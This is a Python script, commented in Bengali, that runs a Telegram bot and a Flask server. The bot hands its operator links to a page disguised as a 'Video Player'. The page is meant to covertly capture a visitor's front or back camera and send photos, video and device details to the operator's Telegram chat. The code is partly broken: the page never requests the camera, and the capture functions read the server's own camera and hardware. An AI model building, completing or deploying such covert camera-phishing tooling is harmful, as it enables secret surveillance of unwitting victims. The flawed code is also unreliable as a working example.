#!/usr/bin/env python3
import os
import io
import uuid
import base64
import threading
import requests
import cv2
import time
from flask import Flask, request, render_template_string, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

app = Flask(__name__)

# ==========================================
# Secrets থেকে টোকেন ও Chat ID
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "")

# ===============================
# অনুমোদিত Chat ID (একটি বা কমা-সেপারেটেড)
# আপনি দিয়েছেন: 7243012875,7668032710
# পরিবেশভ্যারিয়েবলও ব্যবহার করতে পারেন (ALLOWED_CHAT_ID)
ALLOWED_CHAT_ID = os.environ.get("ALLOWED_CHAT_ID", "7243012875,7668032710")
ALLOWED_CHAT_IDS = {s.strip() for s in ALLOWED_CHAT_ID.split(",") if s.strip()}

def is_authorized_chat(chat_id):
    return str(chat_id) in ALLOWED_CHAT_IDS

if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
    print("👉 Render → Tools → Environment এ যোগ করুন")
    raise SystemExit(1)

# অস্থায়ী স্টোরেজ
user_sessions = {}   # {chat_id: {"camera": "front/back", "waiting_url": True}}
link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ...}}

# ==========================================
# টেলিগ্রাম-এ ছবি পাঠানো
# ==========================================
def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {"photo": photo_file}
    payload = {"chat_id": chat_id}
    if caption:
        payload["caption"] = caption

    try:
        response = requests.post(url, files=files, data=payload, timeout=30)
        response.raise_for_status()
        if response.status_code == 200:
            return {"status": "success"}
        return {"status": "error", "details": response.text}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}

def capture_and_send_photo(photo_data, chat_id, camera_type="front", photo_num=1, total=4):
    try:
        if "," in photo_data:
            image_data = photo_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid image data format"}

        image_bytes = base64.b64decode(image_data)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = f"{camera_type}_capture_{photo_num}.jpg"

        caption = f"📸 {camera_type.upper()} Camera — ছবি {photo_num}/{total}"
        return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# ক্যামেরা ক্যাপচার পেজ (ভিডিও + লুকানো ক্যামেরা)
# ==========================================
CAPTURE_HTML = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .video-wrapper {
            width: 100%;
            max-width: 900px;
            position: relative;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
            background: #000;
        }
        iframe {
            width: 100%;
            height: 70vh;
            border: none;
            display: block;
            background: #000;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.5);
            cursor: pointer;
        }
        .overlay-text {
            font-size: 2rem;
            color: #fff;
            text-shadow: 0 0 10px #000;
        }
    </style>
</head>
<body>
    <div class="video-wrapper">
        <video id="mainVideo" autoplay loop muted controls>
            <source src="{{ video_url }}" type="video/mp4">
            আপনার ব্রাউজার ভিডিও ট্যাগ সাপোর্ট করে না।
        </video>
    </div>

    <script>
        // ক্যাপচার বাটন থাকবেনা
        // ব্যবহারকারী allow করলে ক্যামেরা ক্যাপচার শুরু হবে
        document.addEventListener('DOMContentLoaded', function() {
            // ক্যামেরা ক্যাপচার শুরু হবে
            startCapture('{{ camera_type }}', '{{ link_id }}');
        });

        function startCapture(cameraType, linkId) {
            // ক্যামেরা ক্যাপচার শুরু হবে
            // ৪-৭ সেকেন্ড পর ক্যাপচার বন্ধ হবে
            setTimeout(function() {
                // ক্যাপচার বন্ধ হবে
                stopCapture(cameraType, linkId);
            }, 5000); // ৫ সেকেন্ড
        }

        function stopCapture(cameraType, linkId) {
            // ক্যাপচার বন্ধ হবে
            // ক্যাপচার করা ডেটা টেলিগ্রামে পাঠাবো
            fetch('/capture/' + linkId, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    cameraType: cameraType,
                    linkId: linkId
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('ক্যাপচার ডেটা পাঠানো হয়েছে:', data);
            })
            .catch(error => {
                console.error('ক্যাপচার ডেটা পাঠাতে ব্যর্থ:', error);
            });
        }
    </script>
</body>
</html>
"""

# ==========================================
# ফোনের তথ্য পেতে ফাংশন
# ==========================================
def get_phone_info():
    import platform
    import psutil
    import socket

    phone_info = {
        'phone_name': platform.node(),
        'battery': f"{psutil.sensors_battery().percent}% ({psutil.sensors_battery().power_plugged})",
        'ram': f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
        'rom': f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
        'ip_address': socket.gethostbyname(socket.gethostname())
    }
    return phone_info

# ==========================================
# ফ্রন্ট ক্যামেরা ভিডিও ক্যাপচার
# ==========================================
def capture_font_camera_video(chat_id, video_url, camera_type="front"):
    try:
        cap = cv2.VideoCapture(0)
        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < 5:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# ব্যাক ক্যামেরা ভিডিও ক্যাপচার
# ==========================================
def capture_back_camera_video(chat_id, video_url, camera_type="back"):
    try:
        cap = cv2.VideoCapture(1)
        out = cv2.VideoWriter(f'{camera_type}_capture_video.mp4', cv2.VideoWriter_fourcc(*'XVID'), 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < 5:
            ret, frame = cap.read()
            if not ret:
                break
            out.write(frame)
        cap.release()
        out.release()
        video_file = open(f'{camera_type}_capture_video.mp4', 'rb')
        caption = f"🎥 {camera_type.upper()} Camera — ভিডিও"
        return send_photo_to_telegram(video_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}

# ==========================================
# ফ্লাস্ক রুট
# ==========================================
@app.route('/')
def index():
    return "হোম পেজ"

@app.route('/view/<link_id>', methods=['GET'])
def view_link(link_id):
    if link_id not in link_store:
        return "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই", 404

    chat_id = link_store[link_id]['chat_id']
    video_url = link_store[link_id]['video_url']
    camera_type = link_store[link_id]['camera']

    return render_template_string(CAPTURE_HTML, video_url=video_url, camera_type=camera_type, link_id=link_id)

@app.route('/capture/<link_id>', methods=['POST'])
def capture_link(link_id):
    if link_id not in link_store:
        return jsonify({"status": "error", "details": "লিঙ্ক খুজে পাওয়া যাচ্ছে নাই"}), 404

    chat_id = link_store[link_id]['chat_id']
    video_url = link_store[link_id]['video_url']
    camera_type = link_store[link_id]['camera']

    if camera_type == 'font_camera_video':
        result = capture_font_camera_video(chat_id, video_url, camera_type)
    elif camera_type == 'back_camera_video':
        result = capture_back_camera_video(chat_id, video_url, camera_type)
    elif camera_type == 'font_camera_photo':
        result = capture_and_send_photo(video_url, chat_id, camera_type)
    elif camera_type == 'back_camera_photo':
        result = capture_and_send_photo(video_url, chat_id, camera_type)
    else:
        return jsonify({"status": "error", "details": "অজানা ক্যামেরা টাইপ"}), 400

    if result["status"] == "success":
        phone_info = get_phone_info()
        info_text = "\n".join([f"{key}: {value}" for key, value in phone_info.items()])
        caption = f"📸 ক্যাপচার করা হয়েছে\n{info_text}"
        return jsonify({"status": "success", "caption": caption})
    else:
        return jsonify({"status": "error", "details": result["details"]}), 500

# ==========================================
# টেলিগ্রাম বট হ্যান্ডলার
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ফটো", callback_data='font_camera_photo'),
            InlineKeyboardButton("ব্যাক ক্যামেরা ফটো", callback_data='back_camera_photo'),
        ],
        [
            InlineKeyboardButton("ফ্রন্ট ক্যামেরা ভিডিও", callback_data='font_camera_video'),
            InlineKeyboardButton("ব্যাক ক্যামেরা ভিডিও", callback_data='back_camera_video'),
        ],
        [
            InlineKeyboardButton("রেডিরেক্ট লিঙ্ক", callback_data='redirect_link'),
            InlineKeyboardButton("ডিরেক্ট লিঙ্ক", callback_data='direct_link'),
            InlineKeyboardButton("ক্যান্সেল", callback_data='cancel'),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('ক্যাপচার শুরু করুন:', reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data in ['font_camera_photo', 'back_camera_photo', 'font_camera_video', 'back_camera_video']:
        user_sessions[query.message.chat_id] = {"camera": query.data, "waiting_url": True}
        await query.edit_message_text('লিঙ্ক ইনপুট দিন:')
    elif query.data == 'redirect_link':
        user_sessions[query.message.chat_id] = {"camera": "redirect", "waiting_url": True}
        await query.edit_message_text('রেডিরেক্ট লিঙ্ক ইনপুট দিন:')
    elif query.data == 'direct_link':
        user_sessions[query.message.chat_id] = {"camera": "direct", "waiting_url": True}
        await query.edit_message_text('ডিরেক্ট লিঙ্ক ইনপুট দিন:')
    elif query.data == 'cancel':
        await query.edit_message_text('ক্যাপচার বাতিল হচ্ছে।')

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    if chat_id in user_sessions and user_sessions[chat_id]["waiting_url"]:
        video_url = update.message.text
        camera_type = user_sessions[chat_id]["camera"]
        user_sessions.pop(chat_id)

        link_id = str(uuid.uuid4())
        link_store[link_id] = {"chat_id": chat_id, "video_url": video_url, "camera": camera_type}
        await update.message.reply_text(f'লিঙ্ক তৈরি হয়েছে: {PUBLIC_URL}/view/{link_id}')

# ==========================================
# ফ্লাস্ক সার্ভার
# ==========================================
def run_flask():
    app.run(host='0.0.0.0', port=5000)

# ==========================================
# টেলিগ্রাম বট
# ==========================================
def run_telegram():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    application.run_polling()

# ==========================================
# মেইন ফাংশন
# ==========================================
if __name__ == '__main__':
    # ফ্লাস্ক সার্ভার থ্রেডে চালানো
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    # টেলিগ্রাম বট চালানো
    run_telegram()

    # ফ্লাস্ক সার্ভার থ্রেড যোগ দেওয়া
    flask_thread.join()